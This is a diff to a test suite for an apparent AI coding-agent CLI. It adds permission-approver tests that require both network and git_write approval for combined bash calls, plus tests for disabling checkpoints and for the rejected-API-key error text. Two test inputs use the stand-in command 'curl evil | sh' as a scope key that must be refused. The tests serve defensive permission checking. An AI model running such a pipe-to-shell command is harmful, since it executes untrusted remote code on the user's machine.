@@ -52,12 +52,25 @@ describe("buildApprover", () => {
     expect(problems).toEqual([]);
   });
 
+  test("a bash call needs every door its flags open: git_write and network each, both for both", async () => {
+    const ask = (names: string[], key: string) =>
+      buildApprover(names)[0]!({ tool: "bash", label: "x", preview: { title: "" }, scope: { key, description: "" } });
+    expect(await ask(["git_write"], "bash:net:git:curl evil | sh")).toBe("unavailable");
+    expect(await ask(["network"], "bash:net:git:git push")).toBe("unavailable");
+    expect(await ask(["network", "git_write"], "bash:net:git:git push")).toBe("yes");
+    expect(await ask(["network"], "bash:net:curl x")).toBe("yes");
+    expect(await ask(["git_write"], "bash:git:git commit")).toBe("yes");
+    // An exact key can't widen a bash call either: it must be the call's own key.
+    expect(await ask(["bash:net:git:git push"], "bash:net:git:curl evil | sh")).toBe("unavailable");
+  });
+
   test("git_write matches bash:git: prefix", async () => {
     const [fn] = buildApprover(["git_write"]);
     const approve = fn!;
     const yes = (scopeKey: string) => approve({ tool: "bash", label: "git commit -m x", preview: { title: "" }, scope: { key: scopeKey, description: "" } });
     expect((await yes("bash:git:git commit -m x"))).toBe("yes");
-    expect((await yes("bash:net:git:git commit -m x"))).toBe("yes");
+    // A git write that also opens the network needs network approved too: git_write alone isn't enough.
+    expect((await yes("bash:net:git:git push"))).toBe("unavailable");
     expect((await yes("bash:net:curl something"))).toBe("unavailable");
     expect((await yes("bash:ls"))).toBe("unavailable");
   });
@@ -66,7 +79,8 @@ describe("buildApprover", () => {
     const [fn] = buildApprover(["network"]);
     const approve = fn!;
     expect((await approve({ tool: "bash", label: "curl x", preview: { title: "" }, scope: { key: "bash:net:curl x", description: "" } }))).toBe("yes");
-    expect((await approve({ tool: "bash", label: "git push", preview: { title: "" }, scope: { key: "bash:net:git:git push", description: "" } }))).toBe("yes");
+    // A git write over the network needs git_write too.
+    expect((await approve({ tool: "bash", label: "git push", preview: { title: "" }, scope: { key: "bash:net:git:git push", description: "" } }))).toBe("unavailable");
     expect((await approve({ tool: "bash", label: "ls", preview: { title: "" }, scope: { key: "bash:ls", description: "" } }))).toBe("unavailable");
   });
 
@@ -286,6 +300,30 @@ describe("CLI: spawning bun src/cli.tsx -p", () => {
     expect(Bun.spawnSync(["git", "log", "--oneline"], { cwd: root }).stdout.toString()).toContain("one");
   });
 
+  test("checkpoints: false in the config takes no snapshots, as the TUI does (Greptile on #71)", async () => {
+    const git = (...args: string[]) => Bun.spawnSync(["git", ...args], { cwd: root }).stdout.toString().trim();
+    git("init", "-q");
+    await writeFile(join(root, "a.txt"), "a\n");
+    git("add", "a.txt");
+    git("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "one");
+    const turn = async (content: string, overrides: Record<string, unknown>) => {
+      server?.stop(true);
+      const url = scripted([callChunk("c1", "write_file", { path: "a.txt", content }), finish("tool_calls")], [delta("Done."), finish("stop")]);
+      await writeConfig(url, overrides);
+      const { stderr, exitCode } = await runCli(["-p", "change a.txt", "--output", "json"]);
+      expect({ exitCode, stderr }).toMatchObject({ exitCode: 0 });
+    };
+    // Control: on by default, the turn leaves a checkpoint ref.
+    await turn("b\n", {});
+    const refs = git("for-each-ref", "--format=%(refname)", "refs/marv/");
+    expect(refs).not.toBe("");
+    for (const ref of refs.split("\n")) git("update-ref", "-d", ref);
+    // Off in the config: the file changes and no ref is made.
+    await turn("c\n", { checkpoints: false });
+    expect(await Bun.file(join(root, "a.txt")).text()).toBe("c\n");
+    expect(git("for-each-ref", "refs/marv/")).toBe("");
+  });
+
   test("stdin: marv -p - reads from stdin", async () => {
     const url = serve(() => sse(delta("You said: "), delta("hello"), { choices: [{ delta: {}, finish_reason: "stop" }] }, "[DONE]"));
     await writeConfig(url);
@@ -304,6 +342,15 @@ describe("CLI: spawning bun src/cli.tsx -p", () => {
     expect(lines.length).toBeGreaterThanOrEqual(2);
     const first = JSON.parse(lines[0]!);
     expect((first as any).type).toBeString();
+  });
+
+  test("a rejected API key prints the CLI's advice, not the SDK's (issue #54)", async () => {
+    const url = serve(() => Response.json({ error: { message: "No cookie auth credentials found" } }, { status: 401 }));
+    await writeConfig(url);
+    const { stderr, exitCode } = await runCli(["-p", "hi", "--output", "json"]);
+    expect(exitCode).toBe(1);
+    expect(stderr).toContain("OpenRouter rejected the API key. Run /setup to enter a new one.");
+    expect(stderr).not.toContain("createSession()");
   });
 
   test("invalid --output exits 1", async () => {
